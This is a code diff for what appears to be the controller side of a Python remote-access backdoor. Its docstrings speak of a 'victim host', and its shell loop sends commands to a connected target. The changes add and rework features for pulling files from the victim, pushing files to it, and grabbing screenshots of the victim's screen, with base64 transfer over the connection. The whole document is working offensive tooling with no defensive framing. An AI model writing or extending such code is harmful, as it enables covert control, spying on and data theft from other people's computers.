@@ -22,9 +22,14 @@ def shell():
         elif cmd.startswith("cd") and len(cmd) > 1:
             reliable_send(cmd)
         elif cmd.startswith("download"):
-            download(cmd)
+            reliable_send(cmd)
+            download(cmd[9:])
         elif cmd.startswith("upload"):
-            upload(cmd)
+            reliable_send(cmd)
+            upload(cmd[7:])
+        elif cmd.startswith("screenshot"):
+            reliable_send(cmd)
+            download("capture.png")
         else:
             reliable_send(cmd)
             print(reliable_recv())
@@ -53,37 +58,44 @@ def reliable_recv():
         try:
             json_data = json_data + target.recv(1024)
             return json.loads(json_data.decode())
-        except ValueError:
+        except ValueError as e:
+            print(e)
             continue
 
 
-def download(cmd):
+def download(filename):
     """
     Download a file from victim host
-    :param cmd:
+    :param filename:
     :return:
     """
     try:
-        with open(cmd[9:], "wb") as file:
+        with open(filename, "wb") as file:
             result = reliable_recv()
-            file.write(base64.b64decode(result))
-            return True
-    except:
-        return False
+            # convert result from string to bytes, then decode b64
+            result_decoded = base64.b64decode(result.encode())
+            file.write(result_decoded)
+            file.close()
+    except Exception as e:
+        print(e)
 
 
-def upload(cmd):
+def upload(filename):
     """
     Upload a file to victim host
-    :param cmd:
+    :param filename:
     :return:
     """
     try:
-        with open(cmd[7:], "rb") as file:
-            reliable_send(base64.b64encode(file.read()))
-            return True
-    except:
-        return False
+        with open(filename, "rb") as file:
+            # read bytes
+            b64 = base64.b64encode(file.read())
+            # convert to string
+            string = b64.decode()
+            reliable_send(string)
+            print(reliable_recv())
+    except Exception as e:
+        print(e)
 
 
 if __name__ == '__main__':
